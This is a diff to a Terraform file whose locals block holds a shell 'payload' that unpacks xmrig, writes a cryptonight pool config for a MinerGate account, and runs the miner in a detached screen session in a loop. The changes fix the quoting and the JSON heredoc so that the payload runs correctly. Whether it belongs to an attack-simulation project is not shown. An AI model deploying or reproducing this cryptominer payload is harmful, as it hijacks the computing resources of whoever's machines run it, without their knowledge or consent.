@@ -11,8 +11,8 @@ locals {
     payload = <<-EOT
     START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
     MINERGATE_USER="${local.minergate_user}"
-    MINERGATE_SERVER="${local.minergate_server}
-    VERSION=${local.xmrig_version}
+    MINERGATE_SERVER="${local.minergate_server}"
+    VERSION="${local.xmrig_version}"
     
     log "starting script"
     while true; do
@@ -31,21 +31,21 @@ locals {
         tar xvfz xmrig.tar.gz
         cd xmrig-$VERSION
         cat<<EOF > config.json
+    {
+    "algo": "cryptonight",
+    "pools": [
         {
-        "algo": "cryptonight",
-        "pools": [
-            {
-                "url": "$MINERGATE_SERVER",
-                "user": "$MINERGATE_USER",
-                "pass": "x",
-                "enabled": true,
-            }
-        ],
-        "retries": 10,
-        "retry-pause": 3,
-        "watch": true
+            "url": "$MINERGATE_SERVER",
+            "user": "$MINERGATE_USER",
+            "pass": "x",
+            "enabled": true,
         }
-        EOF
+    ],
+    "retries": 10,
+    "retry-pause": 3,
+    "watch": true
+    }
+    EOF
         screen -d -L -Logfile /tmp/${local.app_dirname}.log -S ${local.app_dirname} -m /${local.app_dirname}/xmrig-$VERSION/xmrig -c config.json
         screen -S ${local.app_dirname} -X colon "logfile flush 0^M"
         log 'waiting 30 minutes...';
